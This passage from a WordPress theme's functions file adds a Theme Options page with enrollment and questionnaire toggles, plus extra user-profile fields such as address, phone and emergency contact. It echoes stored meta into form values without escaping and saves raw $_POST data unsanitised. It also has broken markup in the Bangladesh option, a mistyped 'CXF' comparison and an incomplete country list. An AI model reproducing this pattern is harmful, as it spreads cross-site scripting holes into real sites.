			wp_redirect($red); exit;
		}
	}
}
add_action('init', 'pippin_login_member');


/*THEME SETTING*/
/* ----------- Theme Setting ----------*/

function add_theme_menu_item()
{
	add_submenu_page("themes.php", "Theme Options", "Theme Options", "manage_options", "theme-options", "theme_settings_page");

}

add_action("admin_menu", "add_theme_menu_item");

function theme_settings_page()
{
    ?>
	    <div class="wrap">
	    <h1>Theme Options</h1>
	    <form method="post" action="options.php" enctype="multipart/form-data">
	        <?php
	            settings_fields("section");
	            do_settings_sections("theme-options");      
	            submit_button(); 
	        ?>          
	    </form>
		</div>
	<?php
}

function disable_enrollment_func()
{
    
    $options = get_option( 'disable_enrollments' );
    //print_r($options);
    $html = '<input type="checkbox" id="checkbox_example" name="disable_enrollments" value="1"' . checked( 1, $options, false ) . '/>';
    $html .= '<label for="checkbox_example">Disable enrollment</label>';

    echo $html;
    //print_r(get_option('disable_enrollments'));
	?>
    	
    <?php
}

function disable_questionaire()
{
    
    $options = get_option( 'disable_questionairies' );
    //print_r($options);
    $html = '<input type="checkbox" id="disable_questionairies" name="disable_questionairies" value="1"' . checked( 1, $options, false ) . '/>';
    $html .= '<label for="disable_questionairies">Disable Questionaire</label>';

    echo $html;
    //print_r(get_option('disable_enrollments'));
	?>
    	
    <?php
}

function display_theme_panel_fields()
{
	add_settings_section("section", "All Settings", null, "theme-options");
	
    add_settings_field("disable_enrollments", "Disable Enrollment", "disable_enrollment_func", "theme-options", "section");
    add_settings_field("disable_questionairies", "Disable Questionnaire", "disable_questionaire", "theme-options", "section");
	
    register_setting("section", "disable_enrollments");
    register_setting("section", "disable_questionairies");
   
}

add_action("admin_init", "display_theme_panel_fields");


/*05-05-17 changes*/

add_action( 'show_user_profile', 'my_show_extra_profile_fields' );
add_action( 'edit_user_profile', 'my_show_extra_profile_fields' );
//$user=get_current_user();
//$user=$_GET['user_id'];
//echo $user;
function my_show_extra_profile_fields( $user ) {
   
	//$new_user_id=get_current_user_id();
	//echo $new_user_id; 
	//$user_info = get_userdata($user);
	$gender=get_user_meta( $user->ID, 'pippin_user_gender', true );
	$address1=get_user_meta( $user->ID, 'pippin_user_address1', true );
//	$address1=get_user_meta( $user, 'pippin_user_address2', true );
	$user_state=get_user_meta( $user->ID, 'pippin_user_state', true );
	$user_city=get_user_meta( $user->ID, 'pippin_user_city', true );
	$user_country=get_user_meta( $user->ID, 'pippin_user_country', true );
	$user_zip=get_user_meta( $user->ID, 'pippin_user_zip', true );
	$user_phone=get_user_meta( $user->ID, 'pippin_user_phone', true );
	$user_imergency_name=get_user_meta( $user->ID, 'imergency_contact_name', true );
	$user_imergency_phone=get_user_meta( $user->ID, 'imergency_contact_phone', true );
    

?>

	<h3>Other profile information</h3>

	<table class="form-table">

	
		<tr>
		    <th><label for="Gender">Gender</label></th>
           <td>
                <label>
                    <input name="MMERGE3" value="Male" required <?php if($gender=='Male') { echo 'checked="true"'; } else {echo '';}?> type="radio"> <span>Male</span>
                </label>
                <label>
                    <input name="MMERGE3" value="Female" required <?php if($gender=='Female') { echo 'checked="true"'; } else {echo '';}?> type="radio"> <span>Female</span>
                </label>
            </td>
        </tr>
        <tr>
            <th><label>Street Address </label></th>
            <td><input name="addr1" required type="text" value="<?php echo $address1; ?>"></td>
            
       </tr>


        <tr>
            <th><label>City </label></th>
            <td><input name="city" type="text" required value="<?php echo $user_city; ?>"></td>
        </tr>
        
         <tr>
            <th><label>State </label></th>
            <td><input name="state" type="text" required value="<?php echo $user_state; ?>"></td>
        </tr>
        
         <tr>
            <th><label>ZIP </label></th>
            <td><input name="zip" type="text" required value="<?php echo $user_zip; ?>"></td>
        </tr>

        
    
        <tr>
            <th><label>Country </label></th>
            <td><select name="country" required>
                <option value="AF" <?php if($user_country=='AF') { echo $selected='selected'; } else {echo $selected='';}?>>Afghanistan</option>
                <option value="AX" <?php if($user_country=='AX') { echo $selected='selected'; } else {echo $selected='';}?>>Aland Islands</option>
                <option value="AL" <?php if($user_country=='AL') { echo $selected='selected'; } else {echo $selected='';}?>>Albania</option>
                <option value="DZ" <?php if($user_country=='DZ') { echo $selected='selected'; } else {echo $selected='';}?>>Algeria</option>
                <option value="AS" <?php if($user_country=='AS') { echo $selected='selected'; } else {echo $selected='';}?>>American Samoa</option>
                <option value="AD" <?php if($user_country=='AD') { echo $selected='selected'; } else {echo $selected='';}?>>Andorra</option>
                <option value="AO" <?php if($user_country=='AO') { echo $selected='selected'; } else {echo $selected='';}?>>Angola</option>
                <option value="AI" <?php if($user_country=='AI') { echo $selected='selected'; } else {echo $selected='';}?>>Anguilla</option>
                <option value="AQ" <?php if($user_country=='AQ') { echo $selected='selected'; } else {echo $selected='';}?>>Antarctica</option>
                <option value="AG" <?php if($user_country=='AG') { echo $selected='selected'; } else {echo $selected='';}?>>Antigua and Barbuda</option>
                <option value="AR" <?php if($user_country=='AR') { echo $selected='selected'; } else {echo $selected='';}?>>Argentina</option>
                <option value="AM" <?php if($user_country=='AM') { echo $selected='selected'; } else {echo $selected='';}?>>Armenia</option>
                <option value="AW" <?php if($user_country=='AW') { echo $selected='selected'; } else {echo $selected='';}?>>Aruba</option>
                <option value="AU" <?php if($user_country=='AU') { echo $selected='selected'; } else {echo $selected='';}?>>Australia</option>
                <option value="AT" <?php if($user_country=='AT') { echo $selected='selected'; } else {echo $selected='';}?>>Austria</option>
                <option value="AZ" <?php if($user_country=='AZ') { echo $selected='selected'; } else {echo $selected='';}?>>Azerbaijan</option>
                <option value="BS" <?php if($user_country=='BS') { echo $selected='selected'; } else {echo $selected='';}?>>Bahamas</option>
                <option value="BH" <?php if($user_country=='BH') { echo $selected='selected'; } else {echo $selected='';}?>>Bahrain</option>
                <option value="BD <?php if($user_country=='BD') { echo $selected='selected'; } else {echo $selected='';}?>">Bangladesh</option>
                <option value="BB" <?php if($user_country=='BB') { echo $selected='selected'; } else {echo $selected='';}?>>Barbados</option>
                <option value="BY" <?php if($user_country=='BY') { echo $selected='selected'; } else {echo $selected='';}?>>Belarus</option>
                <option value="BE" <?php if($user_country=='BE') { echo $selected='selected'; } else {echo $selected='';}?>>Belgium</option>
                <option value="BZ" <?php if($user_country=='BZ') { echo $selected='selected'; } else {echo $selected='';}?>>Belize</option>
                <option value="BJ" <?php if($user_country=='BJ') { echo $selected='selected'; } else {echo $selected='';}?>>Benin</option>
                <option value="BM" <?php if($user_country=='BM') { echo $selected='selected'; } else {echo $selected='';}?>>Bermuda</option>
                <option value="BT" <?php if($user_country=='BT') { echo $selected='selected'; } else {echo $selected='';}?>>Bhutan</option>
                <option value="BO" <?php if($user_country=='BO') { echo $selected='selected'; } else {echo $selected='';}?>>Bolivia</option>
                <option value="BQ" <?php if($user_country=='BQ') { echo $selected='selected'; } else {echo $selected='';}?>>Bonaire, Saint Eustatius and Saba</option>
                <option value="BA" <?php if($user_country=='BA') { echo $selected='selected'; } else {echo $selected='';}?>>Bosnia and Herzegovina</option>
                <option value="BW" <?php if($user_country=='BW') { echo $selected='selected'; } else {echo $selected='';}?>>Botswana</option>
                <option value="BV" <?php if($user_country=='BV') { echo $selected='selected'; } else {echo $selected='';}?>>Bouvet Island</option>
                <option value="BR" <?php if($user_country=='BR') { echo $selected='selected'; } else {echo $selected='';}?>>Brazil</option>
                <option value="IO" <?php if($user_country=='IO') { echo $selected='selected'; } else {echo $selected='';}?>>British Indian Ocean Territory</option>
                <option value="VG" <?php if($user_country=='VG') { echo $selected='selected'; } else {echo $selected='';}?>>British Virgin Islands</option>
                <option value="KH" <?php if($user_country=='KH') { echo $selected='selected'; } else {echo $selected='';}?>>Cambodia</option>
                <option value="CM" <?php if($user_country=='CM') { echo $selected='selected'; } else {echo $selected='';}?>>Cameroon</option>
                <option value="CA" <?php if($user_country=='CA') { echo $selected='selected'; } else {echo $selected='';}?>>Canada</option>
                <option value="CN" <?php if($user_country=='CN') { echo $selected='selected'; } else {echo $selected='';}?>>China</option>
                <option value="CX" <?php if($user_country=='CXF') { echo $selected='selected'; } else {echo $selected='';}?>>Christmas Island</option>
                <option value="CC" <?php if($user_country=='CC') { echo $selected='selected' ; } else {echo $selected='';}?>>Cocos Islands</option>
                <option value="CO" <?php if($user_country=='CO') { echo $selected='selected'; } else {echo $selected='';}?>>Colombia</option>
                <option value="KM" <?php if($user_country=='KM') { echo $selected='selected'; } else {echo $selected='';}?>>Comoros</option>
                <option value="HR" <?php if($user_country=='HR') { echo $selected='selected'; } else {echo $selected='';}?>>Croatia</option>
                <option value="CU" <?php if($user_country=='CU') { echo $selected='selected'; } else {echo $selected='';}?>>Cuba</option>
                <option value="CW" <?php if($user_country=='CW') { echo $selected='selected'; } else {echo $selected='';}?>>Curacao</option>
                <option value="CY" <?php if($user_country=='CY') { echo $selected='selected'; } else {echo $selected='';}?>>Cyprus</option>
               <option value="FR" <?php if($user_country=='FR') { echo $selected='selected'; } else {echo $selected='';}?>>France</option>
               
                <option value="VI" <?php if($user_country=='VI') { echo $selected='selected'; } else {echo $selected='';}?>>U.S. Virgin Islands</option>
                <option value="UG" <?php if($user_country=='UG') { echo $selected='selected'; } else {echo $selected='';}?>>Uganda</option>
                <option value="UA" <?php if($user_country=='UA') { echo $selected='selected'; } else {echo $selected='';}?>>Ukraine</option>
                <option value="AE" <?php if($user_country=='AE') { echo $selected='selected'; } else {echo $selected='';}?>>United Arab Emirates</option>
                <option value="GB" <?php if($user_country=='GB') { echo $selected='selected'; } else {echo $selected='';}?>>United Kingdom</option>
                <option value="US" <?php if($user_country=='US') { echo $selected='selected'; } else {echo $selected='';}?>>United States</option>
                <option value="UM" <?php if($user_country=='UM') { echo $selected='selected'; } else {echo $selected='';}?>>United States Minor Outlying Islands</option>
                <option value="UY" <?php if($user_country=='UY') { echo $selected='selected'; } else {echo $selected='';}?>>Uruguay</option>
                <option value="UZ" <?php if($user_country=='UZ') { echo $selected='selected'; } else {echo $selected='';}?>>Uzbekistan</option>
                <option value="VN" <?php if($user_country=='VN') { echo $selected='selected'; } else {echo $selected='';}?>>Vietnam</option>
                <option value="WF" <?php if($user_country=='WF') { echo $selected='selected'; } else {echo $selected='';}?>>Wallis and Futuna</option>
                <option value="EH" <?php if($user_country=='EH') { echo $selected='selected'; } else {echo $selected='';}?>>Western Sahara</option>
                <option value="YE" <?php if($user_country=='YE') { echo $selected='selected'; } else {echo $selected='';}?>>Yemen</option>
                <option value="ZM" <?php if($user_country=='ZM') { echo $selected='selected'; } else {echo $selected='';}?>>Zambia</option>
                <option value="ZW" <?php if($user_country=='ZW') { echo $selected='selected'; } else {echo $selected='';}?>>Zimbabwe</option>
            </select></td>
        </tr>

        <tr>
            <th><label>Contact Phone</label></th>
            <td><input name="MMERGE5" type="text" required value="<?php echo $user_phone; ?>"></td>
        </tr>
        
        <tr>
            <th><label>Emergency Contact Name</label></th>
            <td><input name="MMERGE6" type="text" value="<?php echo $user_imergency_name; ?>"></td>
        </tr>
        
         <tr>
            <th><label>Emergency Contact Phone</label></th>
            <td><input name="MMERGE7" type="text" value="<?php echo $user_imergency_phone; ?>"></td>
        </tr>


		    
	

	</table>
<?php }

add_action( 'personal_options_update', 'my_save_extra_profile_fields' );
add_action( 'edit_user_profile_update', 'my_save_extra_profile_fields' );
//$user_id=get_current_user_id();
function my_save_extra_profile_fields( $user_id ) {
 
//echo '<pre>'; print_r($_POST); exit;
	if ( !current_user_can( 'edit_user', $user_id ) )
		return false;

	/* Copy and paste this line for additional fields. Make sure to change 'twitter' to the field ID. */
	//update_usermeta( $user_id, 'twitter', $_POST['twitter'] );
	update_user_meta( $user_id, 'pippin_user_gender', $_POST['MMERGE3'] );
	update_user_meta( $user_id, 'pippin_user_address1', $_POST['addr1'] );
//	update_user_meta( $user_id, 'pippin_user_address2', $_POST['twitter'] );
	update_user_meta( $user_id, 'pippin_user_state', $_POST['state'] );
	update_user_meta( $user_id, 'pippin_user_city', $_POST['city'] );
	update_user_meta( $user_id, 'pippin_user_country', $_POST['country'] );
	update_user_meta( $user_id, 'pippin_user_zip', $_POST['zip'] );
	
	update_user_meta( $user_id, 'pippin_user_phone', $_POST['MMERGE5'] );
	update_user_meta( $user_id, 'imergency_contact_name', $_POST['MMERGE6'] );
	update_user_meta( $user_id, 'imergency_contact_phone', $_POST['MMERGE7'] );
}


?>